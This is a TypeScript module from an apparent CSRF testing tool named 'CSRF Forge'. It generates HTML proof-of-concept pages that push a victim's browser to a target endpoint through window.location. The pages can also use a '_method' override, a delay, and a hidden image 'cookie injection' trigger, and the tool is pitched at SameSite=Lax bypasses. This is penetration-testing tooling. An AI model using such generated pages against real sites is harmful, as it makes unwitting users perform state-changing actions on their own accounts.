import { ParsedRequest } from '../../types';
import { PocGeneratorOptions, escapeHtml, escapeJsString, extractPreflightUrl } from './types';

/**
 * Generates a Top-Level Navigation (window.location) CSRF PoC.
 * Particularly effective for GET-based state changes and SameSite=Lax bypasses.
 */
export function generateNavigationPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const delayMs = options.delayMs || 0;
  const buttonText = options.buttonText || 'Trigger Navigation';
  const includeComments = options.comments !== false;

  // Build target URL with parameters
  let targetUrl = request.url;
  if (options.customParameters && Object.keys(options.customParameters).length > 0) {
    const baseUrl = request.url.split('?')[0] || request.url;
    const allParams = { ...options.customParameters };
    // Inject method override into URL when requested
    if (options.methodOverride && !allParams['_method']) {
      allParams['_method'] = options.methodOverride;
    }
    const searchParams = new URLSearchParams(allParams);
    targetUrl = `${baseUrl}?${searchParams.toString()}`;
  } else if (options.methodOverride) {
    // Append method override to existing URL
    const separator = request.url.includes('?') ? '&' : '?';
    targetUrl = `${request.url}${separator}_method=${encodeURIComponent(options.methodOverride)}`;
  }

  const preflight =
    options.preflight?.enabled && options.preflight.url?.trim()
      ? {
          url: extractPreflightUrl(options.preflight.url),
          mode: options.preflight.triggerMode || 'onerror',
        }
      : null;

  const navigateStatement =
    delayMs > 0
      ? `setTimeout(function() { window.location.href = ${escapeJsString(targetUrl)}; }, ${delayMs});`
      : `window.location.href = ${escapeJsString(targetUrl)};`;

  let preflightHtml = '';
  let scriptHtml = '';

  if (preflight) {
    const eventAttr = preflight.mode === 'onload' ? 'onload' : 'onerror';
    const handler = autoSubmit ? ` ${eventAttr}="${navigateStatement.replace(/"/g, '&quot;')}"` : '';
    preflightHtml = `\n  <!-- Pre-flight trigger / Cookie injection payload (${preflight.mode}) -->\n  <img src="${escapeHtml(
      preflight.url
    )}"${handler} style="display:none;" />\n`;
  } else if (autoSubmit) {
    scriptHtml = `\n  <script>\n    ${navigateStatement}\n  </script>`;
  }

  const commentsHeader = includeComments
    ? `<!--
  CSRF Forge Proof of Concept
  Target URL: ${escapeHtml(targetUrl)}
  Vector: Top-Level Navigation (SameSite=Lax Eligible)
  Generated: ${new Date().toISOString()}
-->\n`
    : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Top-Level Navigation CSRF PoC</title>
</head>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
${commentsHeader}${preflightHtml}  <h2>Security Verification Test</h2>
  <p>Triggering cross-site navigation to target endpoint...</p>
  ${
    !autoSubmit
      ? `  <button onclick="window.location.href=${escapeJsString(
          targetUrl
        )}" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">${escapeHtml(
          buttonText
        )}</button>`
      : ''
  }${scriptHtml}
</body>
</html>`;
}

